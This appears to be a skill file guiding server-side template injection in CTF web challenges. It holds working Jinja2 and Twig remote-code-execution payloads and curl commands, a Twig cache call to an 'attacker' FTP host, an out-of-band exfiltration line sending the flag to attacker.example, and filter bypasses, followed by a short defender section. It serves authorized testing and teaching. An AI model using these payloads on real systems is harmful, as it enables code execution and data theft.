---
name: ctf-web-challenges-ssti-challenges
description: Use when a CTF web challenge renders user input through a
  server-side template engine, or when source shows render_template_string
  or equivalent with user data. Covers detecting SSTI with math probes,
  identifying the engine (Jinja2, Twig, Smarty, Freemarker), Jinja2
  sandbox escapes via subclass traversal to os.popen, reading flag files,
  blind SSTI with out-of-band or timing techniques, and filter bypasses.
  Use when {{7*7}} evaluates to 49 in a response, when template syntax
  reflects, or when source passes request input into a template string.
version: 1.0.0
domain: ctf
lifecycle: stable
last_verified: 2026-10-23
parent: ctf-web-challenges
requires: [ctf-web-challenges]
extends: []
relates: [web-sqli, ctf-web-challenges]
tools:
  - name: Burp Suite
    version: 2026.2
  - name: Python
    version: 3.12
  - name: curl
    version: 8.5
  - name: Node.js
    version: 22.11
---

Server-side template injection happens when user input is embedded in a
template that the server evaluates, turning template syntax into code
execution. In CTFs it is one of the fastest paths from input to flag:
detect with a math probe, identify the engine, walk the object graph to
`os`, and read the flag. This sub-skill covers the authorized methodology
for Jinja2 (the most common), plus Twig/Smarty notes, blind variants, and
filter bypasses. Scope is CTF competitions, lab apps, and systems you have
explicit permission to test.

## Quick Workflow

1. Detect: submit `{{7*7}}`, `${7*7}`, `#{7*7}`, and `<%= 7*7 %>`; a
   `49` in the response confirms SSTI and hints the engine.
2. Identify the engine from source, error messages, or the probe that
   worked (Jinja2/Twig use `{{}}`, Freemarker `${}`, ERB `<%= %>`).
3. Fingerprint the sandbox: try `{{7*'7'}}` (should be `7777777`),
   `{{config}}`, `{{self}}` to see what objects are reachable.
4. Walk to code execution via the standard gadget chain for that
   engine (subclass traversal for Jinja2).
5. Read the flag: `cat /flag*`, check `/app`, environment variables,
   and the database as needed.
6. If output is not reflected, switch to blind techniques (time
   delays, out-of-band reads, or error-based exfiltration).
7. If filters block syntax, bypass with alternative delimiters,
   string concatenation, or filter-chain tricks.
8. Record the working payload verbatim for the writeup.

## 1. Detection and engine identification

```bash
U="http://chals.ctf:8000/hello"
for p in '{{7*7}}' '${7*7}' '#{7*7}' '<%= 7*7 %>' '{{7*"7"}}'; do
  echo "--- $p"
  curl -s -X POST $U -d "name=$p" | head -c 200; echo
done
# {{7*7}} -> 49        : Jinja2 (Python) or Twig (PHP)
# ${7*7}  -> 49        : Freemarker / Velocity (Java)
# <%= 7*7 %> -> 49     : ERB (Ruby) or EJS (Node)
# {{7*"7"}} -> 7777777 : confirms real evaluation, not string math
```

Engine-specific follow-ups: `{{_self}}` renders in Twig, `{{config}}`
renders in Flask/Jinja2, `${"freemarker"}` hints Java. When source is
provided, skip probing and read the render call directly.

## 2. Jinja2 exploitation ladder

Jinja2 is the most common CTF SSTI engine. Climb from recon to RCE.

```bash
# Step 1: what classes are reachable? (dumps huge output, grep it)
curl -s -X POST $U -d 'name={{ "".__class__.__mro__ }}'

# Step 2: list subclasses, find one with os in globals (index varies!)
# do this locally with the same Python version instead of remotely:
python3 -c "
subs = ''.__class__.__mro__[1].__subclasses__()
for i, c in enumerate(subs):
    g = getattr(getattr(c, '__init__', None), '__globals__', {})
    if 'os' in g: print(i, c.__name__)
"
# example output: 139 _wrap_close  (index changes per build: verify!)

# Step 3: RCE via the found subclass (example index 139)
curl -s -X POST $U --data-urlencode \
  "name={{ ''.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__['os'].popen('id').read() }}"

# Step 4: read the flag
curl -s -X POST $U --data-urlencode \
  "name={{ ''.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__['os'].popen('cat /flag*').read() }}"
```

Shorter alternative gadget paths (when `__class__` is filtered):

```
{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}
{{ joiner.__init__.__globals__.os.popen('cat /flag.txt').read() }}
{{ namespace.__init__.__globals__.os.popen('cat /flag.txt').read() }}
```

These work because Jinja2 exposes `cycler`, `joiner`, and `namespace`
objects whose `__init__.__globals__` contains `os`.

## 3. Reading files without os.popen

When `os` is blocked but the object graph is open, read files through
other loaders:

```
{# via the open builtin reached through globals #}
{{ self.__init__.__globals__.__builtins__.open('/flag.txt').read() }}

{# via importlib when builtins are reachable #}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}
```

If only a few attributes are blocked, build blocked strings by
concatenation: `{{ 'o'+'s' }}` or use `request.args` to smuggle the
payload in a second parameter the filter does not inspect.

## 4. Twig (PHP) SSTI

```bash
# Detection: {{7*7}} -> 49 suggests Twig or Jinja2; _self only exists in Twig
curl -s -X POST $U -d 'name={{_self}}'

# Twig RCE (version dependent; try in order)
{{_self.env.setCache("ftp://attacker:pass@host/")}}
{{_self.env.getCache("id")}}

# Newer Twig: via the template object to native functions
{{['id']|map('system')|join}}
{{['cat /flag*']|map('system')|join}}
```

Identify the Twig version from source or error output first; payloads
shift between major versions.

## 5. Blind SSTI

When the template output is not reflected (stored templates, log
rendering), exfiltrate out of band.

```bash
# Time-based confirmation (Jinja2): sleep via os
# {{ namespace.__init__.__globals__.os.popen('sleep 5').read() }}
time curl -s -X POST $U --data-urlencode "name={{ ''.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__['os'].popen('sleep 5').read() }}" -o /dev/null
# 5+ seconds -> code execution confirmed

# Out-of-band exfiltration (if the challenge network allows egress)
# {{ ...os.popen('curl https://attacker.example/$(cat /flag.txt)').read() }}
```

Blind boolean variant: `{% if ... %}true{% endif %}` conditionals that
change a status code or page length let you extract the flag character
by character, same loop shape as blind SQLi.

## 6. Filter bypasses

CTF filters commonly block `{{`, `__`, `.`, or keywords. Bypasses:

- Blocked `{{`/`}}`: try `{% ... %}` with print via `{%= ... %}` in
  some engines, or smuggle through a second parameter.
- Blocked underscores: `{{ request.args.a }}` with `?a=__class__`
  pulls the string from outside the filtered input.
- Blocked dots: `{{ ''['__class__'] }}` uses subscript instead of
  attribute access.
- Blocked keywords (`os`, `popen`): concatenate
  `{{ 'po'+'pen' }}`, or reach equivalents (`subprocess`, `system`).
- Read the filter code from source and bypass it exactly; filters
  that strip once are beaten by nesting (`{{{{` -> `{{`).

## Edge cases

- The template engine autoescapes HTML: SSTI still works because
  evaluation happens before escaping; only the output display changes.
- Sandboxed Jinja2 (`SandboxedEnvironment`): attribute access to
  underscored names is blocked; use the `request.args` smuggling or
  documented sandbox escapes for the pinned version.
- The injection is in an email template rendered offline: output goes
  to a file or mail queue; read it through the app's file download or
  admin view.
- Multiple render passes: the app renders twice; a payload like
  `{{7*7}}` may need double encoding to survive the first pass.
- The engine is obscure (Mako, Pug, Velocity): identify it from error
  pages or source imports first; payloads do not transfer between
  engines.

## Escalation

- Subclass index from the internet does not work: enumerate locally
  with the challenge's Python version (docker image if provided);
  indices shift between builds.
- `os.popen` is blocked but `__subclasses__` works: pivot to file
  read via `open` in builtins, or to `subprocess.Popen`.
- Nothing executes and no error shows: verify the probe actually
  reaches the template (add a canary string), and check whether the
  route you test is the one rendering.
- The flag is not on the filesystem: from the SSTI shell, check
  `env`, the app config (`{{config}}` often leaks secrets), and the
  database credentials for the next hop.

## Detection and defender view

Defenders see SSTI as template delimiters (`{{`, `${`, `<%=`) and
dunder-heavy payloads (`__class__`, `__globals__`, `__subclasses__`) in
request logs, often in long encoded POST bodies. Successful exploitation
shows as web-user processes spawning shells or making odd outbound
connections. Durable fixes: never build template strings from user input
(use template files with variable passing), enable sandboxed
environments with tight allowlists, and keep template engines patched.
Log and alert on `__class__` substrings in input as a cheap signal.

## Key references

- MITRE ATT&CK T1190 (Exploit Public-Facing Application).
- CWE-94 (Improper Control of Generation of Code, Code Injection):
  covers template injection.
- CWE-20 (Improper Input Validation): unsanitized template input.
- PortSwigger SSTI guide: https://portswigger.net/web-security/cross-site-scripting/server-side-template-injection
- HackTricks SSTI: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
